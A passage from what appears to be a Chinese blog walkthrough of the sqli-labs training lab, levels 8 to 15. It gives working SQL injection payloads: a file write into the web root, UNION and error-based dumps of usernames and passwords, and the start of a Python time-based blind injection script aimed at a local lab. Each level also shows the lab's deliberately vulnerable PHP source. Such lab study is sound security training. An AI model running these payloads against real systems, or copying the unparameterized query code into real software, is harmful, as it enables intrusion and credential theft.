"#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-</strong>8</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-8\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'You are in...........';</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-</strong>9</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-9\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-</strong>10</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-10\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-</strong>11</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&#39; union select group_concat(username),group_concat(password) from users;#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-</strong>12</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&quot;) union select group_concat(username),group_concat(password) from users;#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-</strong>13</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&#39;) and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-</strong>14</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname: 1&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"  /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-</strong>15</h1><p>Python（盲注）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># config-start</span></span><br><span class="line">sleep_time = <span class="number">1</span></span><br><span class="line">error_time = <span class="number">0.1</span></span><br><span class="line"><span class="comment"># config-end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(indexOfResult, indexOfChar, mid)</span>:</span></span><br><span class="line">    <span class="comment"># admin' or ()-- </span></span><br><span class="line">    column_name=<span class="string">"password"</span></span><br><span class="line">    table_name=<span class="string">"username"</span></span><br><span class="line">    database_name=<span class="string">"users"</span></span><br><span class="line">    payload = <span class="string">"((ascii(substring((select "</span> + column_name + <span class="string">" from "</span> + database_name + <span class="string">"  limit "</span> + indexOfResult + <span class="string">",1),"</span> + indexOfChar + <span class="string">",1)))="</span> + mid + <span class="string">")"</span><span class="comment">#此处更改sql语句</span></span><br><span class="line">    payload = &#123;<span class="string">"uname"</span>:<span class="string">"' or (("</span> + payload + <span class="string">") and sleep("</span> + str(sleep_time) + <span class="string">"))-- "</span>,<span class="string">"passwd"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exce</span><span class="params">(indexOfResult,indexOfChar,queryASCII)</span>:</span></span><br><span class="line">    <span class="comment"># content-start</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1:801/sqli/Less-15/"</span></span><br><span class="line">    postData = getPayload(indexOfResult,indexOfChar,queryASCII)</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    requests.post(url, data=postData)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    <span class="comment"># content-end</span></span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="comment"># judge-start</span></span><br><span class="line">    <span class="comment"># 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)</span></span><br><span class="line">    <span class="comment"># 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了</span></span><br><span class="line">    <span class="keyword">if</span> abs(use_time) &gt; error_time: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># judge-end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doSearch</span><span class="params">(indexOfResult,indexOfChar)</span>:</span></span><br><span class="line">    <span class="comment"># 根据数据库中出现的字符的频率顺序重新构造列表进行查询</span></span><br><span class="line">    order = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'_'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">' '</span>,<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">'&amp;'</span>,<span class="string">'\''</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">','</span>,<span class="string">'-'</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span 